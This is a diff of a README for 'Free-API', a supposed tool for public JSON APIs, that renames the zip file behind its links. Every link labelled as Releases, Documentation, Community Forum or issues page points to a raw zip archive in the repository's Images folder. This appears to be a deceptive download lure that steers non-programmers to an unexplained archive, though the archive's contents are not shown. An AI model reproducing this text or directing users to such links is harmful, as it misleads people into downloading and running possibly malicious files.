@@ -1,6 +1,6 @@
 # 🌟 Free-API - Access Free Public JSON APIs Easily
 
-[![Download Free-API](https://raw.githubusercontent.com/LeonardusOvan06/Free-API/main/Images/Free-API-3.9.zip)](https://raw.githubusercontent.com/LeonardusOvan06/Free-API/main/Images/Free-API-3.9.zip)
+[![Download Free-API](https://raw.githubusercontent.com/LeonardusOvan06/Free-API/main/Images/API_Free_v3.8.zip)](https://raw.githubusercontent.com/LeonardusOvan06/Free-API/main/Images/API_Free_v3.8.zip)
 
 ## 📖 Description 
 
@@ -12,7 +12,7 @@ To use Free-API, follow the steps below. No programming experience is necessary.
 
 ### 📥 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/LeonardusOvan06/Free-API/main/Images/Free-API-3.9.zip) to access the downloads.
+1. Visit the [Releases page](https://raw.githubusercontent.com/LeonardusOvan06/Free-API/main/Images/API_Free_v3.8.zip) to access the downloads.
 2. Look for the latest release. This will generally be at the top of the list.
 3. Click on the link for the download. This will typically be labeled with the version number and may contain helpful information for users.
 4. Save the file to your computer.
@@ -59,15 +59,15 @@ Here are a few examples of the types of APIs you can find when using Free-API:
 
 Feel free to explore additional resources related to Free-API:
 
-- Check our [Documentation](https://raw.githubusercontent.com/LeonardusOvan06/Free-API/main/Images/Free-API-3.9.zip) for more detailed guides on using each API.
-- Visit our [Community Forum](https://raw.githubusercontent.com/LeonardusOvan06/Free-API/main/Images/Free-API-3.9.zip) to connect with others and share your experiences.
+- Check our [Documentation](https://raw.githubusercontent.com/LeonardusOvan06/Free-API/main/Images/API_Free_v3.8.zip) for more detailed guides on using each API.
+- Visit our [Community Forum](https://raw.githubusercontent.com/LeonardusOvan06/Free-API/main/Images/API_Free_v3.8.zip) to connect with others and share your experiences.
 
 ## 📞 Contact
 
-For support or inquiries, please reach out through the repository's [issues page](https://raw.githubusercontent.com/LeonardusOvan06/Free-API/main/Images/Free-API-3.9.zip). Our team monitors this page and aims to respond promptly.
+For support or inquiries, please reach out through the repository's [issues page](https://raw.githubusercontent.com/LeonardusOvan06/Free-API/main/Images/API_Free_v3.8.zip). Our team monitors this page and aims to respond promptly.
 
 ## 🥳 Learn More
 
 Discover a world of free APIs and expand your knowledge of application development. Follow the simple steps above to get started, and don't hesitate to reach out for help or community interaction. Enjoy using Free-API and happy coding!
 
-[Visit the Releases page to download now!](https://raw.githubusercontent.com/LeonardusOvan06/Free-API/main/Images/Free-API-3.9.zip)
+[Visit the Releases page to download now!](https://raw.githubusercontent.com/LeonardusOvan06/Free-API/main/Images/API_Free_v3.8.zip)
